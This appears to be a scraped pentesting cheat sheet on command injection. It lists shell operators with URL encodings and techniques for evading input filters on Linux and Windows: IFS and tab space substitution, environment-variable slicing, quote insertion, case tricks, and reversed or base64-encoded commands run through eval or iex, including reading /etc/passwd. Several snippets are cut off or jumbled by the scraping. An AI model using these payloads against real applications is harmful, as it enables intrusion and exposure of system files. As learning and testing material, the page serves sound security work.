# Command-injections

##🔧 Injection Operators
🧪 Semicolon
```
;       %3b       # → Executes both commands (Linux & Windows)
```
🔃 New Line
```
\n      %0a       # → Executes both commands (Linux & Windows)
```
🖼️ Background
```
&       %26       # → Executes both commands (second output usually appears first)
```
🧵 Pipe
```
|       %7c       # → Executes both commands (only second output is shown)
```
🟢 AND Operator
```
&&      %26%26    # → Executes second command only if first succeeds (Linux & Windows)
```
🔴 OR Operator
```
||      %7c%7c     # → Executes second command only if first fails (Linux & Windows)
```
🌀 Sub-Shell (Linux Only)
```
``       %60%60        # → Sub-shell execution (Linux-only)
$()      %24%28%29     # → Sub-shell execution (Linux-only)
```

####🐧 Linux - Filtered Character Bypass
🔍 View Environment Variables⛓️ Space Bypass🔀 Other Character Bypass⛔ Blacklisted Command Bypass✒️ Character Insertion🔠 Case Manipulation🔄 Reversed Commands📦 Encoded Commands
###📦 Windows - Filtered Character Bypass
🔍 View Environment Variables (PowerShell)⛓️ Space Bypass🔁 Other Character Bypass⛔ Blacklisted Command Bypass✒️ Character Insertion🔠 Case Manipulation🔄 Reversed Commands📦 Encoded CommandsLast updated 10 months ago- [🔧 Injection Operators](#injection-operators)
- [📦 Windows - Filtered Character Bypass](#windows-filtered-character-bypass)

```
printenv         # Displays all environment variables
```

```
%09             # Use tab instead of space
${IFS}          # Replaced with space/tab (Not usable in sub-shells)
{ls,-la}        # Commas replaced with spaces
```

```
${PATH:0:1}               # Replaced with /
${LS_COLORS:10:1}         # Replaced with ;
$(tr '!-}' '"-~' \)
```

```
' or "    # Must be even number of quotes
$@ or \   # Linux only
```

```
$(tr "[A-Z]" "[a-z]"
```
echo 'whoami' | rev     # Reverse string
eval $(rev
```
echo -n 'cat /etc/passwd | grep 33' | base64     # Encode with base64
bash
```
Get-ChildItem Env:      # View all environment variables
```

```
%09                     # Tab instead of space
%PROGRAMFILES:~10,-5%   # CMD: Replaced with space
$env:PROGRAMFILES[10]   # PowerShell: Replaced with space
```

```
%HOMEPATH:~0,-17%    # CMD: Replaced with \

$env:HOMEPATH[0]     # PowerShell: Replaced with \
```

```
' or "       # Must be even

^            # Windows-only escape character (CMD)
```

```
WhoAmi                                 # Use odd case to bypass basic filters
```

```
"whoami"[-1..-20] -join ''             # Reverse string

iex "$('imaohw'[-1..-20] -join '')"    # Execute reversed command
```

```
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami')) # Encode command

iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))" # Decode & execute
```
